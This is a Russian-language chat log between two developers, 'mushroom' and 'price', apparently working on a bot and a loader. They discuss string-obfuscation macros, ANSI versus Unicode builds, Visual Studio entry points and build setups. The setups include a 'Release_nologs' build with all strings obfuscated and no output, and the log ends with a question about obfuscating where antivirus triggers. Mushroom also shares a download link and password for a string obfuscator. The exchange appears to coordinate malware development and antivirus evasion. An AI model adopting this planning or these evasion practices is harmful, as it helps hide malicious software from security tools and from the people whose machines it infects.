Timestamp	From	To	Message
2020-10-23 12:57:52.102918	mushroom	price	Для ANSI можно сразу использовать _STR("str")
2020-10-23 12:59:23.175171	mushroom	price	Ещё альтернативный обфускатор строк:
Download: https://qaz.im/load/TZRaZF/yhFskK   
Delete: https://qaz.im/index.php?a=delete&q=731386863
Пароль: u[y*`%3Y=H5P0S4<P
2020-10-23 12:59:31.033770	mushroom	price	Он с юникод не работает.
2020-10-23 12:59:48.420737	mushroom	price	Там так только _STR есть.
2020-10-23 13:00:11.884940	mushroom	price	Обфусцируй всё в боте и загрузчике.
2020-10-23 13:00:30.638041	price	mushroom	критично юникод использовать
2020-10-23 13:00:32.201835	price	mushroom	?
2020-10-23 13:00:43.553166	price	mushroom	или на мультибайтах можно остановиться
2020-10-23 13:00:45.437002	mushroom	price	Нет.
2020-10-23 13:00:57.463206	mushroom	price	Что хочешь используй.
2020-10-23 13:01:08.357177	price	mushroom	говорят вмультибайтах плохо в японии с путями работать
2020-10-23 13:01:22.670415	mushroom	price	В юникод программа больше просто по размеру.
2020-10-23 13:01:40.786232	price	mushroom	я к тому при использовании строго анси не встанет потом?
2020-10-23 13:01:51.355975	price	mushroom	в проблему
2020-10-23 13:02:12.044886	mushroom	price	А ты TEXT используй
2020-10-23 13:02:25.037246	mushroom	price	Тогда преключать сможешь легко.
2020-10-23 13:02:48.126625	price	mushroom	не так всё просто бывает переключиться
2020-10-23 13:02:51.254387	mushroom	price	_TSTR(TEXT("str")) автоматом так же обфусцирует анси и юникод.
2020-10-23 13:02:59.857980	price	mushroom	функции есть строго ансишные или наоборот
2020-10-23 13:03:35.212915	mushroom	price	Это какие?
2020-10-23 13:03:47.529537	mushroom	price	Вроде они все в двух видах.
2020-10-23 13:03:53.713600	price	mushroom	ну не знаю, видел вчера
2020-10-23 13:04:14.081125	price	mushroom	например CommandLineToArgvA
2020-10-23 13:04:19.189320	mushroom	price	Делай всё анси тогда.
2020-10-23 13:04:32.169522	price	mushroom	спасибо, прямо камень упал
2020-10-23 13:04:39.518641	mushroom	price	Будет размер меньше.
2020-10-23 13:05:13.243786	mushroom	price	CommandLineToArgvW
2020-10-23 13:05:13.752574	mushroom	price	Есть такая.
2020-10-23 13:05:14.818473	price	mushroom	но у меня реально чудо, пропал вход в функцию в программе
2020-10-23 13:06:41.874829	price	mushroom	на релизе
2020-10-23 13:06:41.940934	price	mushroom	в ld6
2020-10-23 13:07:04.897711	mushroom	price	Точку входа сам укажи.
2020-10-23 13:07:11.057782	mushroom	price	В настройках проекта.
2020-10-23 13:07:11.245284	price	mushroom	а у меня как раз всеё анси и не могу её использовать, но уже есть и ансишная
2020-10-23 13:07:34.817650	price	mushroom	это мысль хорошая, сейчас опробую
2020-10-23 13:07:38.980218	mushroom	price	У subsystem windows не mainCRTSTartup входная.
2020-10-23 13:07:51.628390	mushroom	price	winmainCRTSTartup
2020-10-23 13:07:55.113503	mushroom	price	как то так.
2020-10-23 13:07:56.794181	price	mushroom	вот для дебага как раз она
2020-10-23 13:08:15.950606	price	mushroom	ну да WinMainCRTStartup
2020-10-23 13:08:35.071096	price	mushroom	я сейчас её закреплю
2020-10-23 13:09:18.033416	price	mushroom	БЛИН!
2020-10-23 13:09:37.114412	price	mushroom	у меня как раз уже закреплено было в конфигурации ld6
2020-10-23 13:09:45.301936	price	mushroom	и надо стереть её!
2020-10-23 13:10:08.600309	price	mushroom	бинго
2020-10-23 13:11:02.715525	price	mushroom	Всё! Готов к обфускации!
2020-10-23 13:11:31.158016	price	mushroom	пошел отстук на релизе, есть логирование в файл и на консоль
2020-10-23 13:12:12.911159	price	mushroom	отключу конечно логирование для релиза, вставил для отладки релизной сборки
2020-10-23 13:12:34.053409	mushroom	price	Ещё. Сделай сборки Release_nologs, тоже самое что Release, но все строки обфусцированны и никакого вывода.
2020-10-23 13:12:50.874906	price	mushroom	да, конечно
2020-10-23 13:13:09.650941	mushroom	price	Должно быть так Debug, Release с выводом, Release_nologs как я написал выше.
2020-10-23 13:13:22.794660	mushroom	price	Release должен быть с выводом. Это для тестеров.
2020-10-23 13:13:54.027105	mushroom	price	Чтобы было вверху выбирать что собирать, ну ты понял.
2020-10-23 13:13:58.269859	price	mushroom	ты когда генеришь и меня проверяешь Бэтч билдом делаешь? он при Пуше передается на Гит?
2020-10-23 13:14:05.232461	mushroom	price	В Visual Studio.
2020-10-23 13:14:36.582407	price	mushroom	галочки в бэтч билде
2020-10-23 13:14:50.921738	mushroom	price	Где это бэтч билд?
2020-10-23 13:14:58.020240	mushroom	price	Не знаю такого.
2020-10-23 13:15:09.945048	price	mushroom	классная вещь
2020-10-23 13:15:24.280834	price	mushroom	заходишь в Build
2020-10-23 13:15:38.869951	price	mushroom	и в выпадающем окне Batch Build
2020-10-23 13:15:56.306184	price	mushroom	там указываешь все нужные конфиги и ждёщь судьбу сборки
2020-10-23 13:16:27.394772	price	mushroom	по русски не могу сказать как, может сборка?
2020-10-23 13:16:31.978587	mushroom	price	А по русски это как называется?
2020-10-23 13:16:48.901833	price	mushroom	5 позиция верхнего меню студии
2020-10-23 13:16:56.376829	price	mushroom	после проекта
2020-10-23 13:17:01.093558	mushroom	price	Пакетна сборка.
2020-10-23 13:17:05.571056	price	mushroom	да
2020-10-23 13:17:10.823861	price	mushroom	зайди тебе понравится
2020-10-23 13:17:18.036209	mushroom	price	Проще указать зависимости, проектов.
2020-10-23 13:17:39.907115	mushroom	price	Ты сделал, чтобы я выбрал bd6 собрать и всё что нужно собралось?
2020-10-23 13:17:40.561980	price	mushroom	а когда все надо конфиги поддготовить или проверить
2020-10-23 13:18:12.621382	price	mushroom	я с утра сделал, проверил на ВМ и при посылке /скачивании с ГИТА
2020-10-23 13:18:38.055542	price	mushroom	сейчас ещё проверю поскольку изменения были
2020-10-23 13:18:49.968748	mushroom	price	Хорошо. Когда заработает GitLab посмотрю. Пока обфусцируй всё в Release_nologs.
2020-10-23 13:19:23.601155	price	mushroom	это только в этой сборке надо делать, а в остальных избегать?
2020-10-23 13:19:33.131063	mushroom	price	Да.
2020-10-23 13:19:36.486722	price	mushroom	ок
2020-10-23 13:19:58.159223	mushroom	price	Строки макросом OBFUSCATED_STRINGS включаются.
2020-10-23 13:20:24.070684	mushroom	price	Так что легко в сборках делать обфускацию где надо.
2020-10-23 13:21:00.639734	price	mushroom	а надо где АВ срабатывает?
